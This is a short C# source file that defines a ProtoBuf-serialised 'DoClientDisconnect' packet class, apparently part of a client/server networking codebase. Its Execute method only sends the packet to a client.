using ProtoBuf;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class DoClientDisconnect : IPacket
    {
        public DoClientDisconnect()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}